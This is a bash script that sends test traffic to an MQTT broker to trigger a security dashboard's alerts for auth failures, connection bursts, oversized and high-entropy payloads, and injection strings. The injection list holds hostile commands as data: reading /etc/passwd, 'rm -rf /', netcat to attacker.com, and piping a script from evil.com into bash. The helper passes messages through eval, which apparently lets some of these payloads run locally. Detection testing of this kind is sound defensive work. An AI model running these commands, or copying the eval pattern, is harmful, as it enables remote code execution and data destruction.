#!/bin/bash
#
# MQTT Sentinel Demo - Security Injection Script
# Triggers various security scenarios for demonstration
#
# Usage: ./inject-security.sh [SCENARIO]
#
# Scenarios:
#   all              Run all scenarios (default)
#   auth-failure     Trigger authentication failures
#   rate-anomaly     Trigger rate anomaly detection
#   pattern-violation Trigger pattern matching alerts
#   size-anomaly     Trigger payload size anomaly
#   entropy          Trigger high entropy detection

set -euo pipefail

# Configuration
MOSQUITTO_HOST="${MOSQUITTO_HOST:-localhost}"
MOSQUITTO_PORT="${MOSQUITTO_PORT:-8883}"
MOSQUITTO_USER="${MOSQUITTO_USER:-bridge-user}"
MOSQUITTO_PASS="${MOSQUITTO_PASS:-bridge-password}"
USE_TLS="${USE_TLS:-true}"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

log_scenario() {
    echo -e "${CYAN}[SCENARIO]${NC} $1"
}

# Build mosquitto_pub command with common options
mqtt_pub() {
    local user="$1"
    local topic="$2"
    local message="$3"
    local extra_args="${4:-}"

    local cmd="mosquitto_pub"
    cmd="$cmd -h $MOSQUITTO_HOST"
    cmd="$cmd -p $MOSQUITTO_PORT"
    cmd="$cmd -u \"$user\""

    if [ -n "$MOSQUITTO_PASS" ] && [ "$user" = "$MOSQUITTO_USER" ]; then
        cmd="$cmd -P \"$MOSQUITTO_PASS\""
    fi

    if [ "$USE_TLS" = "true" ]; then
        cmd="$cmd --capath /etc/ssl/certs"
    fi

    cmd="$cmd -t \"$topic\""
    cmd="$cmd -m \"$message\""

    if [ -n "$extra_args" ]; then
        cmd="$cmd $extra_args"
    fi

    eval $cmd 2>&1 || true
}

# Scenario 1: Authentication Failures
scenario_auth_failure() {
    log_scenario "Authentication Failure - Testing invalid credentials"
    echo "  Expected: Auth denied alerts in security dashboard"
    echo ""

    local invalid_users=(
        "invalid-user-xyz"
        "hacker123"
        "admin"
        "root"
        "test-user-999999999"
    )

    for user in "${invalid_users[@]}"; do
        log_info "Attempting connection with invalid user: $user"
        mqtt_pub "$user" "test/topic" "test message" || true
        sleep 0.5
    done

    echo ""
    log_info "Auth failure scenario complete. Check dashboard for auth_failure events."
}

# Scenario 2: Rate Anomaly (Burst Attack)
scenario_rate_anomaly() {
    log_scenario "Rate Anomaly - Simulating burst connection attack"
    echo "  Expected: Rate deviation heuristic alert"
    echo "  Trigger: 100 rapid connections"
    echo ""

    log_info "Launching 100 rapid connection attempts..."

    for i in $(seq 1 100); do
        mqtt_pub "burst-attacker-$i" "burst/test" "ALERT" &
    done

    # Wait for background jobs
    wait

    echo ""
    log_info "Rate anomaly scenario complete. Check dashboard for rate_anomaly events."
}

# Scenario 3: Pattern Violations (Injection Attempts)
scenario_pattern_violation() {
    log_scenario "Pattern Violation - Testing injection detection"
    echo "  Expected: Security scan alerts for command injection"
    echo ""

    local malicious_payloads=(
        "ALERT; cat /etc/passwd"
        "ALERT && rm -rf /"
        "ALERT | nc attacker.com 4444"
        "ALERT\`whoami\`"
        "ALERT\$(curl http://evil.com/shell.sh | bash)"
        "'; DROP TABLE mqtt_clients; --"
        "<script>alert('XSS')</script>"
        "ALERT; wget http://malware.com/backdoor"
    )

    for payload in "${malicious_payloads[@]}"; do
        log_info "Sending malicious payload: ${payload:0:50}..."
        mqtt_pub "$MOSQUITTO_USER" "clients/user1/alerts" "$payload"
        sleep 0.3
    done

    echo ""
    log_info "Pattern violation scenario complete. Check dashboard for pattern_violation events."
}

# Scenario 4: Size Anomaly
scenario_size_anomaly() {
    log_scenario "Size Anomaly - Testing oversized payload detection"
    echo "  Expected: Size anomaly heuristic alert"
    echo "  Trigger: 100KB payload (expected: ~5 bytes)"
    echo ""

    # Generate a 100KB payload
    log_info "Generating 100KB payload..."
    local large_payload=$(head -c 102400 /dev/urandom | base64 | tr -d '\n')

    log_info "Sending oversized payload..."
    mqtt_pub "$MOSQUITTO_USER" "clients/user1/alerts" "$large_payload"

    echo ""
    log_info "Size anomaly scenario complete. Check dashboard for size_anomaly events."
}

# Scenario 5: High Entropy Detection
scenario_entropy() {
    log_scenario "High Entropy - Testing encrypted/encoded payload detection"
    echo "  Expected: High entropy heuristic alert"
    echo "  Trigger: Base64-encoded binary data"
    echo ""

    local entropy_payloads=(
        # Random binary data (high entropy)
        "$(head -c 1024 /dev/urandom | base64 | tr -d '\n')"
        # Encrypted-looking data
        "U2FsdGVkX1+vupppZksvRf5pq5g5XjFRIipRkwB0K1Y96Qsv2Lm+31cmzaAILwyt"
        # Compressed data simulation
        "H4sIAAAAAAAAA0tJTc7PLShKLS5RBABVnD7JDQAAAA=="
    )

    for payload in "${entropy_payloads[@]}"; do
        log_info "Sending high-entropy payload (${#payload} bytes)..."
        mqtt_pub "$MOSQUITTO_USER" "clients/user1/alerts" "$payload"
        sleep 0.3
    done

    echo ""
    log_info "Entropy detection scenario complete. Check dashboard for entropy_anomaly events."
}

# Run all scenarios
run_all() {
    log_info "Running all security injection scenarios"
    log_info "========================================"
    echo ""

    scenario_auth_failure
    echo ""
    sleep 2

    scenario_pattern_violation
    echo ""
    sleep 2

    scenario_size_anomaly
    echo ""
    sleep 2

    scenario_entropy
    echo ""
    sleep 2

    scenario_rate_anomaly
    echo ""

    log_info "========================================"
    log_info "All scenarios complete!"
    log_info ""
    log_info "Open Grafana Security Dashboard to view:"
    log_info "  - Authentication failures"
    log_info "  - Pattern violation alerts"
    log_info "  - Size anomaly events"
    log_info "  - High entropy detections"
    log_info "  - Rate anomaly alerts"
}

# Show usage
usage() {
    echo "Usage: $0 [SCENARIO]"
    echo ""
    echo "Scenarios:"
    echo "  all               Run all scenarios (default)"
    echo "  auth-failure      Trigger authentication failures"
    echo "  rate-anomaly      Trigger rate anomaly detection"
    echo "  pattern-violation Trigger pattern matching alerts"
    echo "  size-anomaly      Trigger payload size anomaly"
    echo "  entropy           Trigger high entropy detection"
    echo ""
    echo "Environment variables:"
    echo "  MOSQUITTO_HOST    Broker hostname (default: localhost)"
    echo "  MOSQUITTO_PORT    Broker port (default: 8883)"
    echo "  MOSQUITTO_USER    Username for valid connections"
    echo "  MOSQUITTO_PASS    Password for valid connections"
    echo "  USE_TLS           Use TLS (default: true)"
    exit 0
}

# Main
case "${1:-all}" in
    all)
        run_all
        ;;
    auth-failure)
        scenario_auth_failure
        ;;
    rate-anomaly)
        scenario_rate_anomaly
        ;;
    pattern-violation)
        scenario_pattern_violation
        ;;
    size-anomaly)
        scenario_size_anomaly
        ;;
    entropy)
        scenario_entropy
        ;;
    --help|-h)
        usage
        ;;
    *)
        log_error "Unknown scenario: $1"
        usage
        ;;
esac
